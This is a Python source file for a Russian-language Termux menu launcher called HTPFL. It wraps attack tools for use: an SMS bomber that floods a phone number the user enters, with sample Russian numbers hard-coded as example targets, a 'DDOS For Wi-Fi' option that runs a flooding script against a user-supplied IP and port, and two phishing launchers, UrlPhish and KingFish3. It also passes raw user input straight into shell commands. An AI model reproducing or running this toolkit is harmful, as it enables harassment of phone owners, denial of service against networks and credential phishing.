# Импортирование модулей
from termcolor import colored
import os
import sys
from time import sleep
from random import choice, randint

# Баннер
os.system("clear")


def Banner():
    os.system("clear")
    color = ["red", "blue", "yellow", "green", "cyan", "magenta"]
    color2 = choice(color)
    Banner = ''' 
  _    _ _______ _____  ______ _
 | |  | |__   __|  __ \|  ____| |
 | |__| |  | |  | |__) | |__  | |
 |  __  |  | |  |  ___/|  __| | |
 | |  | |  | |  | |    | |    | |____
 |_|  |_|  |_|  |_|    |_|    |______|
     '''
    print(colored(Banner, color2))
    print(colored("                0.7.8", color2))
    print("")
    # ---
    color3 = choice(color)
    color4 = choice(color)
    color5 = choice(color)
    color6 = choice(color)
    color7 = choice(color)
    color8 = choice(color)
    color9 = choice(color)
    color10 = choice(color)
    color11 = choice(color)

    A1 = colored("S", color3)
    A2 = colored("m", color4)
    A3 = colored("s", color5)
    A4 = colored("B", color6)
    A5 = colored("o", color7)
    A6 = colored("m", color8)
    A7 = colored("b", color9)
    A8 = colored("e", color10)
    A9 = colored("r", color11)

    ist = (colored("[1]", "red"))
    print(ist, A1 + A2 + A3, A4 + A5 + A6 + A7 + A8 + A9)
    print("")
    fah = (colored("[2]", "red"))
    fah2 = (colored("VPN For Termux", "blue"))
    print(fah, fah2)
    print("")
    psh = colored("[3]", "red")
    psh2 = colored("DDOS", "magenta")
    psh3 = colored("For Wi-Fi", "cyan")
    print(psh, psh2, psh3)
    print("")
    url = colored("[4]", "red")
    url2 = colored("UrlPhish", "yellow")
    print(url, url2)
    print("")
    ngr = colored("[5]", "red")
    ngr2 = colored("ngrok", "green")
    print(ngr, ngr2)
    print("")
    kfg3 = colored("[6]", "red")
    kfg32 = colored("KingFish3", "blue")
    print(kfg3, kfg32)
    print("")
    ksy = colored("[99]", "red")
    ksy2 = colored("О Программе", "cyan")
    print(ksy, ksy2)
    print("")
    print("")
    upd = colored("[Act]", "red")
    upd2 = colored("Действия Панели", "green")
    podd = colored("[Sup]", "red")
    podd2 = colored("Поддержать автора", "yellow")
    print(upd, upd2)
    istD = (colored("[0]", "red"))
    istD2 = (colored("Выход", "red"))
    print(istD, istD2)
    print("")


Banner()


# Списки
by = ["Всего доброго!", "Досвидания!", "Удачи!", "Пока!", "До встречи!"]
by2 = choice(by)

# Переменный для ядра
grf = (colored("[1]", "cyan"))
grf2 = (colored("[2]", "cyan"))
grf3 = (colored("download", "yellow"))
grf4 = (colored("start", "green"))
hsg = (colored("Назад", "red"))


#Функции
def osnova():
    while True:
        about()



def Bomb():
    print("")
    st = colored("Impulse", "green")
    st2 = colored("[2]", "cyan")
    # --
    ex = colored("Назад", "red")
    ex2 = colored("[0]", "red")
    # --
    up = colored("download modules for Impulse", "yellow")
    up2 = colored("[1]", "cyan")
    # --
    bo2 = colored("b0mb3r", "yellow")
    bo = colored("[4]", "cyan")
    # --
    ka = colored("download b0mb3r", "yellow")
    ka2 = colored("[3]", "cyan")
    print(up2, up)
    print(st2, st)
    print("")
    print(ka2, ka)
    print(bo, bo2)
    print("")
    print("")
    print(ex2, ex)
    print("")
    q = input(colored(" —>> ", "red"))
    if q == "download modules for Impulse" or q == "1":
        print("")
        os.system("pip install --upgrade pip")
        os.system("pip install wget && pip install humanfriendly")
        print("")
        aga = colored("Complete!", "green")
        aga2 = colored("Download of modules is ", "yellow")
        print(aga2, aga)
        print("")
        while True:
            sleep(1.15)
            Bomb()
    elif q == "2" or q == "Impulse" or q == "impulse":
        print("")
        print(colored("Примеры", "green"))
        print("")
        # --
        PHONES = ["79506258294", "79857255263", "79087147393", "79057148241", "78008366273", "78005553535"]
        RandPHONE = choice(PHONES)
        ColorPHONE = colored(RandPHONE, "blue")
        # --
        Colors = ["white", "yellow", "green", "blue", "cyan", "magenta", "red"]
        RandColor = choice(Colors)
        RandNumb = randint(10, 1000)
        RandNumb2 = colored(RandNumb, RandColor)
        time = colored("", RandColor)
        # --
        RandNumb2 = randint(3, 200)

        print("PHONE -", ColorPHONE)
        print("Время -", str(RandNumb2) + "сек")
        ooos = colored("От 3 - 200", RandColor)
        print("Мощность - " + ooos)
        print("")
        sleep(1)
        PHONE = input(colored(" PHONE >> ", "red"))
        time = input(colored(" Время >> ", "red"))
        threads = input(colored(" Мощность >> ", "red"))
        print("")
        print(colored("Хотите начать спам через опредленое время или сразу?", "yellow"))
        print(colored("Если через определнное время, укажите его в секундах", "green"))
        print(colored("Если сразу напишите 0", "green"))
        print("")
        okey = int(input(colored(" —>> ", "red")))
        if okey == 0:
            os.system("cd % && python impulse.py --target " + PHONE + " --method SMS --time " + time + " --threads " + threads)
        elif okey > 900:
            print("")
            print(colored("Слишком большое время, вы уверны что хотите продолжить с промежутком в " + str(okey) + " Секунд?"))
            print("")
            print(colored("Да | Нет", "magenta"))
            print("")
            sog = input(colored(" —>> ", "red"))
            if sog == "Да" or sog == "да":
                sleep(okey)
                os.system("cd % && python impulse.py --target " + PHONE + " --method SMS --time " + time + " --threads " + threads)
            elif sog == "Нет" or sog == "нет":
                os.system("clear")
                print("")
                print("Попробуйте заного", "blue")
                print("")
                while True:
                    Bomb()
            else:
                print("")
                bol = colored("БОЛЬНОЙ??", "red")
                print("Ты " + bol)
                print("")
                sleep(1.4)
                sys.exit(0)
        elif okey > 0:
            sleep(okey)
            os.system("cd % && python impulse.py --target " + PHONE + " --method SMS --time " + time + " --threads " + threads)
    elif q == "b0mb3r" or q == "bomber" or q == "B0mb3r" or q == "4":
        print("")
        print(colored("starting...", "green"))
        sleep(1.45)
        bomb = ["b0mb3r", "bomber"]
        ran = choice(bomb)
        os.system(ran)
        print("")
    elif q == "download b0mb3r" or q == "3":
        print("")
        print(colored("starting download...", "green"))
        print("")
        os.system("pip install b0mb3r -U")
        print("")
        print(colored("Complete!", "green"))
        print("")
    else:
        os.system("clear")
        print("")
        print(colored(" ERROR ", "red"))
        print("")
        while True:
            Banner()
            osnova()



def RVpn():
    print("")
    print(grf, grf3)
    print(grf2, grf4)
    un = (colored("remove", "magenta"))
    un2 = (colored("[3]", "cyan"))
    print(un2, un)
    print("")
    print("")
    jsh = (colored("[0]", "red"))
    print(jsh, hsg)
    print("")
    vpn = input(colored(" —>> ", "red"))
    print("")
    if vpn == "1" or vpn == "download":
        print("")
        print(colored("После первой установки, устанавливать еще раз не нужно", "cyan"))
        print("")
        sleep(3)
        os.system("pkg install tor -y")
        print("")
        print(colored("Complete!", "green"))
        print("")
        sleep(1.1)
        while True:
            RVpn()
    elif vpn == "2" or vpn == "start":
        print("")
        print(colored("Запуск VPN начнётся через 12с после выбора пункта", "green"))
        print("")
        print(colored(
            "Когда на экране у опредленной строки 'Bootstrapped' будет значение 100%, тогда можно будет использовать другие утилиты, обязательно в новой сессии, для того чтобы остановить введите 'Ctrl + C",
            "yellow"))
        print("")
        sleep(12)
        os.system("tor")
    elif vpn == "3" or vpn == "remove":
        sleep(2)
        print("")
        os.system("pkg uninstall tor -y")
        print("")
        print(colored("Deletion Completed!", "green"))
        print("")
        sleep(1.1)
        while True:
            RVpn()
    elif vpn == "0" or vpn == "Назад":
        while True:
            os.system("clear")
            Banner()
            osnova()


def ddos():
    print("")
    ahg4 = colored("[2]", "cyan")
    ahg5 = colored("start", "green")
    ahg6 = colored("[0] Назад", "red")
    up3 = colored("download modules", "yellow")
    up4 = colored("[1]", "cyan")
    print(up4, up3)
    print(ahg4, ahg5)
    print("")
    print("")
    print(ahg6)
    print("")
    ddosr = input(colored(" —>> ", "red"))
    if ddosr == "1":
        print("")
        print(colored("Starting downloads modules..."))
        print("")
        sleep(1.35)
        os.system("pkg install python2")
        while True:
            ddos()
    elif ddosr == "2":
        ip = input(colored("Шлюз или IP ", "blue"))
        port = input(colored("Открытый Порт ", "blue"))
        print("")
        ctrl = colored('"Ctrl + Z"', "green")
        cht = colored("ЧТОБЫ ОСТАНОВИТЬ ДДОС ИСПОЛЬЗУЙ КОМБИНАЦИЮ", "red")
        print(cht, ctrl)
        print("")
        an = ('5', '4', '3', '2', '1')
        ian = 0
        while True:
            print('start через - ', colored(an[ian % len(an)], 'green'), sep='', end='\r')
            sleep(1)
            ian += 1
            if ian * 0.1 > 0.45: break
        print(colored('Starting!                            ', "green"))
        print("")
        os.system("python2 d.py " + ip + " " + port + " 3000")
    else:
        while True:
            os.system("clear")
            Banner()
            osnova()


def url():
    print("")
    ahg = colored("[1]", "green")
    ahg2 = colored("start", "green")
    ahg3 = colored("[0] Назад", "red")
    print(ahg, ahg2)
    print("")
    print("")
    print(ahg3)
    print("")
    bro = input(colored(" —>> ", "red"))
    if bro == "1" or bro == "start":
        os.system("clear && python3 u.py")
        sleep(0.1)
        sys.exit(0)
    else:
        while True:
            Banner()
            osnova()


def ngrok():
    print("")
    qo = colored("[1]", "cyan")
    qo2 = colored("[2]", "cyan")
    wo = colored("Активировать ngrok", "yellow")
    wo2 = colored("start", "green")
    print(qo, wo)
    print(qo2, wo2)
    print("")
    print("")
    nz6 = colored("[0]", "red")
    nz5 = colored("Назад", "red")
    print(nz6, nz5)
    print("")
    ngrokr = input(colored(" —>> ", "red"))
    if ngrokr == "1" or ngrok == "Активировать ngrok":
        print("")
        token = input(colored("Введите ваш Токен ", "blue"))
        os.system("./ngrok authtoken " + token)
        os.system("chmod +x ngrok")
        print("")
        akt = colored("Токен активирован! Если при запуске ngrok у вас будет постоянный", "magenta")
        akt2 = colored("то включите мобильную точку доступа", "magenta")
        akt3 = colored("reconnecting", "red")
        print(akt, akt3, akt2)
        print("")
        print("Вы будете перенаправлены на главную панель через 10 секунд")
        sleep(10)
    elif ngrokr == "2" or ngrok == "start":
        print("")
        locport = input(colored("Укажите локальный порт ", "blue"))
        print("")
        os.system("./ngrok http " + locport)
    else:
        while True:
            Banner()
            osnova()


def act():
    print("")
    upds = colored("[1]", "cyan")
    upds2 = colored("Update", "green")
    print(upds, upds2)
    remove2 = colored("[2]", "cyan")
    remove = colored("Remove", "red")
    print(remove2, remove)
    mod2 = colored("[3]", "cyan")
    mod = colored("Update all modules", "yellow")
    print(mod2, mod)
    restr = colored("[4]", "cyan")
    restr2 = colored("Restart", "magenta")
    print(restr, restr2)
    print("")
    print("")
    nz = colored("[0]", "red")
    nz2 = colored("Назад", "red")
    print(nz, nz2)
    print("")
    actr = input(colored(" —>> ", "red"))
    if actr == "1" or act == "Update":
        print("")
        print(colored("Starting update...", "green"))
        print("")
        sleep(1.45)
        os.system("cd && rm -rf HTPFL && git clone https://github.com/Lucky1376/HTPFL && cd HTPFL && python HTPFL.py")
        exit()
        sys.exit(0)
        print("")
    elif actr == "2" or act == "Remove":
        print("")
        print(colored("Starting remove...", "magenta"))
        print("")
        sleep(1.45)
        os.system("cd && rm -rf HTPFL")
        sys.exit(0)
        os.system("clear")
        exit()
        print("")
    elif actr == "3" or act == "Update all modules":
        print(colored("Да | Нет", "blue"))
        podtv = input(colored("Обновление всех модулей может занять очень много времени, вы согласны с таким решением? ", "red"))
        if podtv == "Да" or podtv == "да":
            print("")
            print(colored("Starting update all modules", "yellow"))
            print("")
            sleep(1.45)
            os.system(
                "pkg update -y && pkg upgrade -y && pkg update git -y && pkg update python && pip install --upgrade pip && pip install --upgrade colored && pip install --upgrade requests && pip install --upgrade argparse && pip install --upgrade colorama && pip install --upgrade termcolor && pkg update python2 && pip install --upgrade wget && pip install --upgrade humanfriendly && pip install --upgrade b0mb3r && pip install --upgrade multiprocessing && pip install --upgrade prettytable")
            print("")
            print(colored("Complete!", "green"))
            print("")
            print("")
        else:
            while True:
                os.system("clear")
                act()
    elif actr == "4" or actr == "Restart":
        print("")
        an = ('|','/','-','\\')
        ian = 0
        while True:
            print('Loading... ', colored(an[ian % len(an)], 'green'), sep='', end='\r')
            sleep(0.5)
            ian += 1
            if ian * 0.1 > 0.45: break
        print(colored('Restart                                         ', "green"))
        print("")
        os.system("python HTPFL.py")
        sleep(0.1)
        sys.exit(0)
    else:
        os.system("clear")
        while True:
            Banner()
            osnova()

def kfg():
    print("")
    str10 = colored("[2]", "cyan")
    str11 = colored("start", "green")
    mod = colored("download modules for KingFish3", "yellow")
    mod2 = colored("[1]", "cyan")
    print(mod2, mod)
    print(str10, str11)
    print("")
    print("")
    print(colored("[0] Назад", "red"))
    print("")
    kfgi = input(colored(" —>> ", "red"))
    if kfgi == "2" or kfgi == "start":
        print("")
        os.system("cd kfg3 && python fsh.py")
        sleep(1)
        while True:
            kfg()
        print("")
    elif kfgi == "1" or kfgi == "download modules for KingFish3":
        print("")
        os.system("pip install prettytable && pip install multiprocessing")
        print("")
        print(colored("Complete!", "green"))
        print("")
        print("")
    elif kfgi == "0" or kfgi == "Назад":
        while True:
            Banner()
            osnova()
    else:
        print("")
        print("Ты БОЛЬНОЙ??", "red")
        sleep(1.55)
        while True:
            kfg()


def programm():
    print("")
    name = colored("Lucky", "red")
    raz = colored("Разработчик -", "cyan")
    print(raz, name)
    vr = colored("0.7.8", "blue")
    ver = colored("Version -", "cyan")
    print(ver, vr)
    lang = colored("Python", "green")
    lan = colored("Язык -", "cyan")
    print(lan, lang)
    vk = colored("https://m.vk.com/id554311036", "magenta")
    vkp = colored("VK -", "cyan")
    print(vkp, vk)
    tg = colored("https://t.me/Lucky1376", "cyan")
    tgo = colored("Telegram -", "blue")
    print(tgo, tg)
    print("")
    print("")
    jsg = (colored("[0]", "red"))
    print(jsg, hsg)
    print("")
    sled = input(colored(" —>> ", "red"))
    if sled == "0" or sled == "Назад":
        while True:
            os.system("clear")
            Banner()
            osnova()
    elif numb == "0" or numb == "Выход":
        os.system("clear")
        print("")
        print(colored(by2, "green"))
        print("")
        sys.exit(0)


def about():
    global numb
    numb = (input(colored(" —>> ", "red")))
    if numb == "1" or numb == "Sms Bomber":
        while True:
            Bomb()
    elif numb == "2" or numb == "VPN For Termux":
        while True:
            RVpn()
    elif numb == "3" or numb == "DDOS For Wi-Fi":
        while True:
            ddos()
    elif numb == "4" or numb == "UrlPhish":
        while True:
            url()
    elif numb == "5" or numb == "ngrok":
        while True:
            ngrok()
    elif numb == "6" or numb == "KingFish3":
        while True:
            kfg()
    elif numb == "99" or numb == "О Программе":
        while True:
            programm()
    elif numb == "act" or numb == "Act" or numb == "Действия Панели":
        while True:
            act()
    elif numb == "0" or numb == "Выход":
        os.system("clear")
        print("")
        print(colored(by2, "green"))
        print("")
        sys.exit(0)
    else:
        os.system("clear")
        print("")
        print(colored("ERROR", "red"))
        print("")
        sys.exit(0)

while True:
    about()
